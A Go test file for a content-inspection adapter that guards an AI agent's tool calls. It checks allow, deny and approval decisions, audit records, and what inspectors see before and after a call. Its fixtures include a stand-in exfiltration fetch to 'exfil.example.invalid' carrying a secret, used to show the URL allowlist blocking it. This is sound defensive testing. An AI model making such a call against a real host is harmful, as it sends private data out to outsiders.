package contentguard_test

import (
	"context"
	"encoding/json"
	"errors"
	"log/slog"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/authzed/openagentprimitives/pkg/authz/contentguard"
	"github.com/authzed/openagentprimitives/pkg/platform/pipeline"
)

type stubInstance struct {
	f   contentguard.Finding
	err error
}

func (s stubInstance) Points() []pipeline.Point { return []pipeline.Point{pipeline.PostToolCall} }
func (s stubInstance) Inspect(context.Context, contentguard.Subject) (contentguard.Finding, error) {
	return s.f, s.err
}

// recordingInstance captures the Subject the adapter built, so a test can pin
// what an inspector actually gets to see at each point.
type recordingInstance struct {
	points []pipeline.Point
	got    contentguard.Subject
	f      contentguard.Finding
}

func (r *recordingInstance) Points() []pipeline.Point { return r.points }
func (r *recordingInstance) Inspect(_ context.Context, s contentguard.Subject) (contentguard.Finding, error) {
	r.got = s
	return r.f, nil
}

func postInput() pipeline.Input {
	return pipeline.Input{Point: pipeline.PostToolCall, Tool: &pipeline.ToolCallInfo{Name: "fetch", Result: "x"}}
}

func TestAdapter_MapsFindingToDecision(t *testing.T) {
	cases := []struct {
		name    string
		inst    stubInstance
		wantVer pipeline.Verdict
		wantApr bool
	}{
		{"pass: Allow, no approval", stubInstance{f: contentguard.Finding{Action: contentguard.Pass}}, pipeline.Allow, false},
		{"block: Deny", stubInstance{f: contentguard.Finding{Action: contentguard.Block, Reason: "bad url"}}, pipeline.Deny, false},
		{"approve: Approval ask", stubInstance{f: contentguard.Finding{Action: contentguard.Approve, Reason: "review url"}}, pipeline.Allow, true},
		{"inspect error: fail closed to Deny", stubInstance{err: errors.New("boom")}, pipeline.Deny, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var got *contentguard.Event
			h := contentguard.NewAdapter("url-allowlist", tc.inst,
				func(_ context.Context, e contentguard.Event) { got = &e }, slog.Default(), pipeline.TimeoutDeny)
			dec := h.Eval(context.Background(), postInput())
			assert.Equal(t, tc.wantVer, dec.Verdict)
			assert.Equal(t, tc.wantApr, dec.Approval != nil)
			if dec.Approval != nil {
				assert.Equal(t, "content_inspection", dec.Approval.Kind)
			}
			require.NotNil(t, got, "audit event must always be recorded")
			assert.Equal(t, "url-allowlist", got.Inspector)
		})
	}
}

// TestAdapter_BuildsTheSubjectForEachPoint pins the per-point projection the
// adapter performs, which is the ONLY thing that puts content in front of an
// inspector. Both shipped kinds default to {PreToolCall, PostToolCall} when
// `points` is unset, so the args side is on by default — and both read
// `s.Args` at PreToolCall and `s.Result` at PostToolCall. An empty Args at
// PreToolCall is therefore not a cosmetic gap: the inspector scans "" , finds
// nothing, and Passes, so the tool-INPUT half of every configured guard
// (url-allowlist's egress rules, the prompt-injection detector) silently stops
// enforcing while the audit log still records a clean pass.
func TestAdapter_BuildsTheSubjectForEachPoint(t *testing.T) {
	args := json.RawMessage(`{"url":"https://exfil.example.invalid/?d=secret"}`)

	cases := []struct {
		name       string
		point      pipeline.Point
		in         pipeline.Input
		wantArgs   json.RawMessage
		wantResult string
	}{
		{
			name:  "PreToolCall: inspector sees the tool ARGS, not a result",
			point: pipeline.PreToolCall,
			in: pipeline.Input{Point: pipeline.PreToolCall, Tool: &pipeline.ToolCallInfo{
				Name: "fetch", Args: args, Result: "must not leak into the pre-call subject",
			}},
			wantArgs:   args,
			wantResult: "",
		},
		{
			name:  "PostToolCall: inspector sees the RESULT, not the args",
			point: pipeline.PostToolCall,
			in: pipeline.Input{Point: pipeline.PostToolCall, Tool: &pipeline.ToolCallInfo{
				Name: "fetch", Args: args, Result: "https://exfil.example.invalid/?d=secret",
			}},
			wantArgs:   nil,
			wantResult: "https://exfil.example.invalid/?d=secret",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			inst := &recordingInstance{points: []pipeline.Point{pipeline.PreToolCall, pipeline.PostToolCall}}
			h := contentguard.NewAdapter("url-allowlist", inst,
				func(context.Context, contentguard.Event) {}, slog.Default(), pipeline.TimeoutDeny)
			h.Eval(context.Background(), tc.in)

			assert.Equal(t, tc.point, inst.got.Point, "the point must be carried through verbatim")
			assert.Equal(t, "fetch", inst.got.ToolName)
			assert.Equal(t, tc.wantArgs, inst.got.Args, "Args projection")
			assert.Equal(t, tc.wantResult, inst.got.Result, "Result projection")
		})
	}
}

// TestAdapter_PreToolCallBlockDeniesTheCall drives the args side all the way to
// a Decision: a Block at PreToolCall must deny the tool call itself, which is
// the enforcement the args branch exists to deliver.
func TestAdapter_PreToolCallBlockDeniesTheCall(t *testing.T) {
	inst := &recordingInstance{
		points: []pipeline.Point{pipeline.PreToolCall},
		f:      contentguard.Finding{Action: contentguard.Block, Reason: "url-allowlist: 1 non-allowlisted URL(s)"},
	}
	var got *contentguard.Event
	h := contentguard.NewAdapter("url-allowlist", inst,
		func(_ context.Context, e contentguard.Event) { got = &e }, slog.Default(), pipeline.TimeoutDeny)

	dec := h.Eval(context.Background(), pipeline.Input{Point: pipeline.PreToolCall, Tool: &pipeline.ToolCallInfo{
		Name: "fetch", Args: json.RawMessage(`{"url":"https://exfil.example.invalid"}`),
	}})

	assert.Equal(t, pipeline.Deny, dec.Verdict)
	assert.Equal(t, "url-allowlist: 1 non-allowlisted URL(s)", dec.Reason)
	require.NotNil(t, got, "audit event must be recorded on the args side too")
	assert.Equal(t, string(pipeline.PreToolCall), got.Point,
		"the audit record must say WHICH side blocked; a mislabelled point sends the operator to the wrong half of the guard")
}

// TestAdapter_ThreadsInjectedTimeoutPolicyIntoAsk proves NewAdapter genuinely
// carries the caller-injected onTimeout policy into the built
// content_inspection ApprovalAsk, rather than the adapter silently defaulting
// to the pipeline.TimeoutPolicy zero value (TimeoutDeny). contentguard cannot
// import the lifecycle package (see package doc), so the runner computes the
// table-sourced policy and injects it here; this test locks that plumbing.
func TestAdapter_ThreadsInjectedTimeoutPolicyIntoAsk(t *testing.T) {
	inst := stubInstance{f: contentguard.Finding{Action: contentguard.Approve, Reason: "review url"}}
	h := contentguard.NewAdapter("url-allowlist", inst,
		func(context.Context, contentguard.Event) {}, slog.Default(), pipeline.TimeoutHalt)
	dec := h.Eval(context.Background(), postInput())
	require.NotNil(t, dec.Approval, "Approve finding must produce an ApprovalAsk")
	assert.Equal(t, pipeline.TimeoutHalt, dec.Approval.OnTimeout,
		"NewAdapter must thread the injected onTimeout policy into the built ask")
}
